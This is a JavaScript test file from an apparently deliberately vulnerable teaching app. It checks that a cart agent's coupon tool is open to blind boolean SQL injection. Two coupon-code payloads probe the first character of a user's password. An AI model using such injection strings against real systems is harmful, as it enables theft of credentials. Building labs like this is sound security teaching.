const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { seedShop, purgeToolCaches } = require('../_fixture.js');

const REPO = path.resolve(__dirname, '../../../..');

/**
 * @intentional-vulnerability sqli-blind-boolean
 * @teaches OWASP-Web:A03
 * @location agent-host/agents/cart/tools/index.js
 */
test('sqli-blind-boolean: cart.apply_coupon reveals password first char', async () => {
  const s = await seedShop();
  purgeToolCaches();
  try {
    const { applyCoupon } = require(path.join(REPO, 'agent-host/agents/cart/tools/index.js'));
    // alice's password is 'admin_hash_alice' — first char 'a'
    const truthy = await applyCoupon({ code: `SUMMER10' AND (SELECT SUBSTR(password,1,1) FROM shop_users WHERE username='alice')='a` });
    const falsy  = await applyCoupon({ code: `SUMMER10' AND (SELECT SUBSTR(password,1,1) FROM shop_users WHERE username='alice')='Z` });
    assert.notEqual(truthy.valid, falsy.valid);
    assert.equal(truthy.valid, true);
    assert.equal(falsy.valid, false);
  } finally {
    await s.close();
  }
});
